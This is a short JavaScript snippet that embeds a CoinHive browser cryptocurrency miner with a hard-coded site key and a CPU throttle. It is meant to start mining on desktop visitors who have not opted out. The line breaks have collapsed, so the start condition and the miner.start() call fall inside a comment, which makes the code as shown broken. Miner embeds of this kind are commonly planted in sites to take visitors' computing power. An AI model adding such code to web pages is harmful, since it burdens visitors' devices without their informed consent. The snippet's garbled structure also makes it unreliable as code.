var miner = new CoinHive.Anonymous('o2ogmjfoONatih6YvAa9KYwQn1kGCAqQ', {
    throttle: 0.3
}); // Only start on non-mobile devices and if not opted-out// in the last 14400 seconds (4 hours):if (!miner.isMobile() && !miner.didOptOut(14400)) {miner.start();}